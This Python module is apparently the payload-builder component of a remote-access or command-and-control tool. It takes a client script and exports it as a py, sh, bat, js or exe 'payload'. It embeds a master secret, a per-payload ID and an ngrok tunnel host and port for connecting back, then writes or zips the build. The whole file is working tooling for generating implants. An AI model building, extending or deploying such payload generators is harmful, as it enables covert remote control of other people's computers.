"""Orchestrator: picks the right exporter, reads the client, writes files.

Single entry point for the dashboard (and anything else) to turn
``client/client.py`` into a payload for a chosen target format.
"""

from pathlib import Path

from exporter.formats.bat_exporter import BatExporter
from exporter.formats.exe_exporter import ExeExporter
from exporter.formats.js_exporter import JsExporter
from exporter.formats.py_exporter import PyExporter
from exporter.formats.sh_exporter import ShExporter
from exporter.bundler import bundle_payload


#: Project root, resolved once from this file's location (exporter/..).
_PROJECT_ROOT = Path(__file__).resolve().parent.parent


class ExportManager:
    """Front-end for the payload exporters."""

    EXPORTERS = {
        "py":  PyExporter,
        "sh":  ShExporter,
        "bat": BatExporter,
        "js":  JsExporter,
        "exe": ExeExporter,
    }

    #: Prefix for generated filenames (payload_<fmt><ext>).
    FILENAME_PREFIX = "payload_"

    def __init__(self, client_path: str = "client/client.py", server_state=None):
        self.client_path = (_PROJECT_ROOT / client_path).resolve()
        self.server_state = server_state

    # ---- public API ------------------------------------------------------

    @classmethod
    def formats(cls) -> list:
        """Sorted list of supported format keys."""
        return sorted(cls.EXPORTERS)

    def export(self, fmt: str, output_dir: str = "builds/",
               embed_secret: bool = True) -> Path:
        """Export the client as ``fmt`` and return the main output path.

        Optionally prepends identity + secret + ngrok target globals to the
        client source before encoding.
        """
        fmt = fmt.lower()
        if fmt not in self.EXPORTERS:
            raise ValueError(
                f"Unknown format {fmt!r}. "
                f"Supported: {', '.join(self.formats())}"
            )

        if not self.client_path.is_file():
            raise FileNotFoundError(f"Client source not found: {self.client_path}")

        client_source = self.client_path.read_text(encoding="utf-8")

        if embed_secret or self.server_state is not None:
            from core.config import Config
            _cfg = Config()

            # Master secret: ServerState wins if present, else Config
            if self.server_state is not None:
                _master = self.server_state.get_secret()
            else:
                _master = _cfg.auth_secret

            _prelude = (
                f"_RSC_MASTER_SECRET = {_master!r}\n"
                f"_RSC_ROTATION_SECONDS = {_cfg.rotation_seconds}\n"
            )

            # Identity (only with ServerState)
            if self.server_state is not None:
                import secrets as _secrets
                _payload_uuid = _secrets.token_hex(16)
                self.server_state.register_payload(_payload_uuid)
                _prelude += (
                    f"_RSC_SERVER_UUID = {self.server_state.server_uuid!r}\n"
                    f"_RSC_PAYLOAD_UUID = {_payload_uuid!r}\n"
                )

            # Ngrok target (config override > live server tunnel > nothing)
            _ngrok = None
            _explicit = _cfg.get("server", "ngrok_url")
            if _explicit:
                from core.ngrok import parse_ngrok_url
                _ngrok = parse_ngrok_url(_explicit)
            else:
                # Check if the currently running server instance has an active Ngrok tunnel
                from web.state import get_state
                try:
                    state = get_state()
                    if state.server and state.server.ngrok and state.server.ngrok.public_url:
                        _ngrok = parse_ngrok_url(state.server.ngrok.public_url)
                except Exception:
                    # Fallback to old API detection if web state isn't available
                    from core.ngrok import detect_tunnel
                    _ngrok = detect_tunnel()

            if _ngrok and _ngrok[0]:
                _prelude += (
                    f"_RSC_NGROK_HOST = {_ngrok[0]!r}\n"
                    f"_RSC_NGROK_PORT = {_ngrok[1]}\n"
                )

            _prelude += "\n"
            client_source = _prelude + client_source

        exporter = self.EXPORTERS[fmt]()
        main_content = exporter.export(client_source)
        companions = exporter.companion_files(client_source)

        out_dir = (_PROJECT_ROOT / output_dir).resolve()
        out_dir.mkdir(parents=True, exist_ok=True)

        main_path = out_dir / f"{self.FILENAME_PREFIX}{fmt}{exporter.extension}"
        main_path.write_text(main_content, encoding="utf-8", newline="")

        for name, content in companions.items():
            (out_dir / name).write_text(content, encoding="utf-8", newline="")

        return main_path

    def export_bundle(self, fmt: str, output_dir: str = "builds/") -> Path:
        """Like :meth:`export` but also bundles the payload with ``core/``.

        Returns the path to the produced ``.zip``.
        """
        payload_path = self.export(fmt, output_dir=output_dir)
        out_dir = (_PROJECT_ROOT / output_dir).resolve()
        return bundle_payload(payload_path, out_dir)

    # ---- dunder ----------------------------------------------------------

    def __repr__(self) -> str:
        return f"<ExportManager client={self.client_path} formats={self.formats()}>"
